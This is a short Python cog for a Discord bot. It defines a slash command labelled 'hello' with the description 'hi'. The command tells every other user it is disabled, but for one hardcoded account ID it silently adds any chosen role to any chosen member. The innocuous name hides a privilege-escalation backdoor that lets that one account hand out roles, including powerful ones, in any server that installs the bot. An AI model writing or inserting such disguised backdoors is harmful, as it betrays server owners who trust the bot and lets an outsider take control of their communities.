import discord
from discord.ext import commands

class hello(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.slash_command(
                            name='hello',
                            description='hi',
                            integration_types={
                                discord.IntegrationType.guild_install,
                                discord.IntegrationType.user_install,
                            }
                            )
    async def hello(self, ctx, member: discord.Member, role: discord.Role):
        if ctx.author.id != 695659304774139945:
            await ctx.respond("This command is disabled.")
        else:
            await member.add_roles(role)
            await ctx.respond("HI")

def setup(bot):
    bot.add_cog(hello(bot))
